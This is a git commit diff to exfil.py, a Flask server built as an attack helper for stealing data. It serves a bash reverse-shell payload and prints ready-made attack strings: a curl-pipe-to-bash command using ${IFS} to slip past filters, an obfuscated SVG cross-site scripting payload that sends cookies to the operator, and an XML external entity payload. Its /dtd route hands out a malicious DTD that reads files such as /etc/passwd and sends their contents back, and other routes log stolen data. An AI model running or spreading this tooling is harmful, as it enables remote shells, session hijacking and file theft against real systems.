5bd8fa79f443b7a21fd4caaba3534c6f65cbbaad
DaddyBigFish <159576755+DaddyBigFish@users.noreply.github.com>
2026-08-05 00:31:57 +0100

    Update exfil.py

--- exfil.py
+++ exfil.py
@@ -1,43 +1,49 @@
 #!/usr/bin/env python3
 from flask import Flask,Response,request
-import sys
-import logging
+import sys,logging,argparse,socket,netifaces
 log=logging.getLogger('werkzeug')
 log.disabled=True
 cli=sys.modules['flask.cli']
 cli.show_server_banner=lambda*x:None
-a=Flask(__name__)
+p=argparse.ArgumentParser()
+p.add_argument('-i',required=True,help='IP or interface name')
+a=p.parse_args()
+if a.i.replace('.','').isdigit():
+ ip=a.i
+else:
+ try:ip=netifaces.ifaddresses(a.i)[netifaces.AF_INET][0]['addr']
+ except:print('Interface not found');sys.exit(1)
+app=Flask(__name__)
 l={}
-print(r"""
-** Exfil using routes! **
-shell     curl+http://<address>/rev/443|bash
-session   <svg%0Conload="\u0064ocument.write('<img%0Csrc=http://<address>?c='%2b\u0064ocument.cookie%2b'>')"/>
-file      <?xml version="1.0"?><!DOCTYPE x SYSTEM "http://<address>/dtd?file=/etc/passwd"><x>&e1;</x>
-""")
-@a.route('/rev/<int:p>')
+print("""
+\033[38;5;208m** Exfil using routes! **\033[0m
+🐚: curl${IFS}http://%s/rev/443|bash
+🍪: <svg%%0Conload="\\u0064ocument.write('<img%%0Csrc=http://%s?c='%%2b\\u0064ocument.cookie%%2b'>')"/>
+🗂️: Content-Type: text/xml <?xml version="1.0"?><!DOCTYPE x SYSTEM "http://%s/dtd"><x>&e1;</x>
+"""%(ip,ip,ip))
+@app.route('/rev/<int:p>')
 def r(p):
- ip=request.host.split(':')[0]if':'in request.host else request.host
  payload=f'bash -i >& /dev/tcp/{ip}/{p} 0>&1'
  return Response(payload,mimetype='text/plain')
-@a.route('/dtd')
+@app.route('/dtd')
 def dtd():
- f=request.args.get('file')
- if f:
-  l[request.remote_addr]=f
-  return Response(f'<!ENTITY % file SYSTEM "file://{f}"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://{request.host}/dtd?data=%file;\'>">%eval;%exfil;',mimetype='application/xml')
  data=request.args.get('data')
- if data:
-  print('----------------------------------------------------')
-  print('\033[92mConnected\033[0m')
-  print('Host: '+request.remote_addr)
-  print('User-Agent: '+request.headers.get('User-Agent',''))
-  print('File: '+l.get(request.remote_addr,''))
-  print(data)
-  print('----------------------------------------------------')
-  print()
-  return'',204
+ if data is None:
+  f=request.args.get('file')or'/proc/self/cwd'
+  l[request.remote_addr]=f
+  return Response(f'<!ENTITY % file SYSTEM "file://{f}"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://{ip}/dtd?data=%file;\'>">%eval;%exfil;',mimetype='application/xml')
+ print('----------------------------------------------------')
+ print('\033[92mConnected\033[0m')
+ print('Host: '+request.remote_addr)
+ print('User-Agent: '+request.headers.get('User-Agent',''))
+ print('File: '+l.get(request.remote_addr,''))
+ print(data)
+ if l.get(request.remote_addr)=='/proc/self/cwd':
+  print('\033[92mRead the file system using the route /dtd?file=<directory/file>\033[0m')
+ print('----------------------------------------------------')
+ print()
  return'',204
-@a.route('/',methods=['GET','POST'])
+@app.route('/',methods=['GET','POST'])
 def h():
  d=request.args.get('c')or request.get_data(as_text=True)or''
  if d:
@@ -53,4 +59,4 @@ def h():
   print()
  return'',204
 if __name__=="__main__":
- a.run(host='0.0.0.0',port=80,debug=False)
+ app.run(host='0.0.0.0',port=80,debug=False)
